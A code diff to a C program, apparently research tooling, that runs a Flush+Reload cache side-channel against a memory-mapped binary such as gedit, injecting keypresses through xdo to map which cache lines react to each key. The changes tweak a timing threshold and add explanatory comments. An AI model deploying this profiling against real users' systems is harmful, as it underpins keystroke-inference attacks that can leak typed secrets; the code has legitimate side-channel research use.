@@ -12,7 +12,7 @@
 #include "../../cacheutils.h"
 
 // this number varies on different systems
-#define MIN_CACHE_MISS_CYCLES (155)
+#define MIN_CACHE_MISS_CYCLES (185)
 
 xdo_t* xdo;
 size_t nkeys = 0;
@@ -41,6 +41,7 @@ size_t flushandreload(void* addr, size_t duration)
   return count;
 }
 
+// writes the character key if not changed else it deletes everythihg and start from fresh.
 void keythread()
 {
   int count = 0;
@@ -73,6 +74,8 @@ int main(int argc, char** argv)
   key[0] = 'a';
   xdo = xdo_new(NULL);
   xdo_get_active_window(xdo,&win);
+
+  // Input parsing.
   if (argc != 8)
     exit(!fprintf(stderr,"  usage: ./spy <probeduration> <addressrange> <perms> <offset> <dev> <inode> <filename>\n"
                  "example: ./spy 200             400000-489000  --    0        -- -- /usr/bin/gedit\n"));
@@ -93,36 +96,53 @@ int main(int argc, char** argv)
   fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
   if (duration == 0)
     exit(0);
+
+  // Call the thread.
   pthread_create(&t,0,(void*(*)(void*))keythread,0);
+
+  // Open the file and get the offset.
   int fd = open(filename,O_RDONLY);
   start = ((unsigned char*)mmap(0, range, PROT_READ, MAP_SHARED, fd, offset & ~0xFFFUL)) + (offset & 0xFFFUL);
+  
+  
   char j = 0;
   char* chars = "0123456789abcdefghijklmnopqrstuvwxyz";
   size_t chars_len = strlen(chars);
   size_t count = 0;
   printf("%8s","addr");
+
+  
   for (j = 0; j < chars_len; ++j)
   {
     printf(",%4c",chars[j]);
   }
   printf("\n");
+  
+  
   size_t promille = 0;
- 	for (size_t i = 0; i < range; i += 64)
+  
+  // Loop over the complete range of offset.
+  for (size_t i = 0; i < range; i += 64)
   {
    printf("%s,%8p",filename,(void*)offset + i);
+
    for (j = 0; j < chars_len; ++j)
    {
      key[0] = chars[j];
+     // trying to schedule the keythread to resest everything.
      for (size_t k = 0; k < 5; ++k)
        sched_yield();
      nkeys = 0;
      flush(start + i);
+     // yielding to schedule the thread which is pressing the keys in the editor so that it goes in the cache.
      for (size_t k = 0; k < 5; ++k)
        sched_yield();
-     count = flushandreload(start + i, duration);
-     printf(",=%4ld/%4ld",count,nkeys);
+     count = flushandreload(start + i, duration);   //check the time.
+     printf(",=%4ld/%4ld",count,nkeys);     // we got 'count' number of cache hits out of 'nkeys' number of key presses.
     }
     printf("\n");
+
+    // Just for benchmarking.
     if (1000 * i / range > promille)
     {
       promille = 1000 * i / range;
